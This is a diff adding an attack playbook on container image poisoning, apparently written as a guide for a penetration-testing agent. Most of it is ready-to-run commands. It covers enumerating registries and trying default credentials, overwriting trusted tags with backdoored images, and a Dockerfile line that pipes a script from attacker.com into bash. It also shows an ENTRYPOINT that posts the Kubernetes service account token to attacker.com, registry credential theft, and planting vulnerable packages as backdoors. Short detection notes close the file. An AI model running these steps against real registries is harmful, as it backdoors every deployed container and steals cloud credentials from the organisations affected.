@@ -1,0 +1,261 @@
+<vulnerability_guide>
+  <title>CONTAINER IMAGE POISONING</title>
+
+  <critical>Container images are the foundation of cloud-native deployments. Poisoning container images affects every container instance deployed from them. Registry compromise, base image manipulation, and build process attacks can inject persistent backdoors that survive redeployments and scale across entire infrastructures.</critical>
+
+  <scope>
+    - Registry access and manipulation
+    - Base image supply chain attacks
+    - Layer manipulation and injection
+    - Tag mislabeling attacks
+    - Build process exploitation
+    - Image signature bypass
+  </scope>
+
+  <methodology>
+    1. REGISTRY ENUMERATION
+       {% raw %}
+       # Find container registries
+       # Common registry URLs:
+       # - registry.company.com
+       # - docker.company.com
+       # - harbor.company.com
+       # - gcr.io/project-id
+       # - ACCOUNT.dkr.ecr.REGION.amazonaws.com
+
+       # Test for unauthenticated access
+       curl -s https://registry.target.com/v2/_catalog
+       curl -s https://registry.target.com/v2/app/tags/list
+
+       # Check for default credentials
+       # Harbor: admin/Harbor12345
+       # Nexus: admin/admin123
+
+       # Docker Hub enumeration
+       curl -s "https://hub.docker.com/v2/repositories/target/?page_size=100"
+       {% endraw %}
+
+    2. IMAGE ANALYSIS
+       {% raw %}
+       # Pull and analyze image
+       docker pull target.com/app:latest
+
+       # Extract layers
+       docker save target.com/app:latest -o image.tar
+       tar -xf image.tar
+
+       # Analyze each layer
+       for layer in */layer.tar; do
+         tar -tf "$layer" | head -20
+       done
+
+       # Check for secrets in layers
+       # Even if removed in later layers, still present in history
+       docker history --no-trunc target.com/app:latest
+
+       # Dive tool for layer analysis
+       dive target.com/app:latest
+       {% endraw %}
+
+    3. IMAGE MANIPULATION
+       {% raw %}
+       # Modify existing image
+       # Add malicious layer
+       docker run -it target.com/app:latest /bin/sh
+       # Make changes (add backdoor, modify files)
+       docker commit <container_id> target.com/app:latest
+
+       # Push modified image
+       docker push target.com/app:latest
+
+       # Layer injection
+       # Create malicious layer
+       FROM target.com/app:latest
+       RUN curl https://attacker.com/backdoor.sh | bash
+       # Build and push with same tag
+
+       # Squash attack
+       # Flatten image to hide malicious layer history
+       docker build --squash -t target.com/app:latest .
+       {% endraw %}
+
+    4. BASE IMAGE ATTACKS
+       {% raw %}
+       # Base image supply chain
+
+       # Check what base images are used
+       grep -r "^FROM" . --include="Dockerfile"
+
+       # Popular targets:
+       # - alpine
+       # - ubuntu
+       # - node
+       # - python
+       # - golang
+
+       # Attack vectors:
+       # 1. Compromise public base image
+       # 2. Typosquatting: alphine instead of alpine
+       # 3. Internal base image manipulation
+       # 4. Version tag manipulation
+
+       # Check image provenance
+       docker trust inspect --pretty target.com/app:latest
+       {% endraw %}
+
+    5. TAG MANIPULATION
+       {% raw %}
+       # Tags are mutable by default
+
+       # Overwrite legitimate tag
+       docker pull attacker.com/malicious:v1
+       docker tag attacker.com/malicious:v1 target.com/app:latest
+       docker push target.com/app:latest
+
+       # Version tag confusion
+       # Push malicious image as "1.0.1" when "1.0.0" is trusted
+       # If using "latest" or "^1.0", malicious version pulled
+
+       # Digest vs tag
+       # Digests are immutable
+       # target.com/app@sha256:abc123... (safe)
+       # target.com/app:latest (can change)
+       {% endraw %}
+  </methodology>
+
+  <advanced_techniques>
+    <multi_stage_poisoning>
+      {% raw %}
+      # Poison build stage images
+
+      # Builder images often less monitored
+      FROM node:alpine AS builder
+      # If node:alpine poisoned, malicious code runs during build
+      # Even if not in final image
+
+      # Build-time secrets exposure
+      # Build args visible in layer history
+      ARG SECRET_KEY  # Visible with docker history
+      {% endraw %}
+    </multi_stage_poisoning>
+
+    <registry_credential_theft>
+      {% raw %}
+      # Steal registry credentials
+
+      # Docker config locations
+      ~/.docker/config.json
+      /root/.docker/config.json
+
+      # Kubernetes registry secrets
+      kubectl get secrets -o json | jq '.items[].data[".dockerconfigjson"]' | base64 -d
+
+      # CI/CD systems
+      # DOCKER_USERNAME, DOCKER_PASSWORD
+      # AWS_ECR_LOGIN
+      # GCR_JSON_KEY
+      {% endraw %}
+    </registry_credential_theft>
+
+    <cosign_bypass>
+      {% raw %}
+      # Container image signing bypass
+
+      # Check for signing
+      cosign verify target.com/app:latest
+
+      # Bypass vectors:
+      # 1. Signature not verified at deploy time
+      # 2. Verification policy too permissive
+      # 3. Key management weaknesses
+
+      # Check Kubernetes admission
+      # If no policy, unsigned images allowed
+
+      # Sigstore/Fulcio certificate issues
+      # Check OIDC token validation
+      # Organization restrictions
+      {% endraw %}
+    </cosign_bypass>
+
+    <vulnerability_injection>
+      {% raw %}
+      # Inject known vulnerabilities for later exploitation
+
+      # Add vulnerable components
+      FROM ubuntu:latest
+      RUN apt-get install -y openssh-server=1:7.2p2-4  # Vulnerable version
+
+      # Vulnerable libraries
+      RUN pip install requests==2.5.0  # CVE-2018-18074
+
+      # Backdoor disguised as vulnerability
+      # Add vulnerable component that you know how to exploit
+      {% endraw %}
+    </vulnerability_injection>
+
+    <init_process_manipulation>
+      {% raw %}
+      # Modify container init process
+
+      # ENTRYPOINT manipulation
+      FROM target.com/app:latest
+      COPY backdoor.sh /
+      ENTRYPOINT ["/backdoor.sh"]
+      CMD ["original-command"]
+
+      # Wrapper script injection
+      # backdoor.sh runs malicious code then exec's original
+
+      # S6/tini/dumb-init abuse
+      # Replace init system with malicious version
+      {% endraw %}
+    </init_process_manipulation>
+
+    <runtime_credential_harvesting>
+      {% raw %}
+      # Image that harvests runtime credentials
+
+      # Kubernetes service account
+      ENTRYPOINT ["/bin/sh", "-c", \
+        "cat /var/run/secrets/kubernetes.io/serviceaccount/token | \
+        curl -d @- https://attacker.com/; \
+        exec original-command"]
+
+      # Cloud metadata
+      # AWS: curl 169.254.169.254/latest/meta-data/iam/...
+      # GCP: curl metadata.google.internal/...
+
+      # Environment variable exfiltration
+      # env | curl -d @- https://attacker.com/
+      {% endraw %}
+    </runtime_credential_harvesting>
+  </advanced_techniques>
+
+  <detection>
+    - Monitor registry for tag overwrites
+    - Alert on unsigned image deployments
+    - Track base image changes
+    - Scan images for known vulnerabilities
+    - Compare image digests across deployments
+  </detection>
+
+  <validation>
+    - Successfully push modified image
+    - Overwrite existing image tags
+    - Inject malicious layer
+    - Bypass image signing verification
+    - Extract secrets from image history
+  </validation>
+
+  <pro_tips>
+    - docker history shows all layers, including "deleted" content
+    - Image digests in Kubernetes deployments prevent tag poisoning
+    - Harbor and ECR support immutable tags - check if enabled
+    - Multi-stage builds can leak secrets in builder stage
+    - cosign keyless signing uses OIDC - check trust policies
+    - Registry webhooks can alert on pushes - check configuration
+  </pro_tips>
+
+  <remember>Container images are immutable but tags are not. Anyone with push access can replace "latest" or any other tag with a malicious image. Use digests for critical deployments, enable image signing, and monitor registry activity. Image poisoning scales instantly - every new container gets the malicious version.</remember>
+</vulnerability_guide>
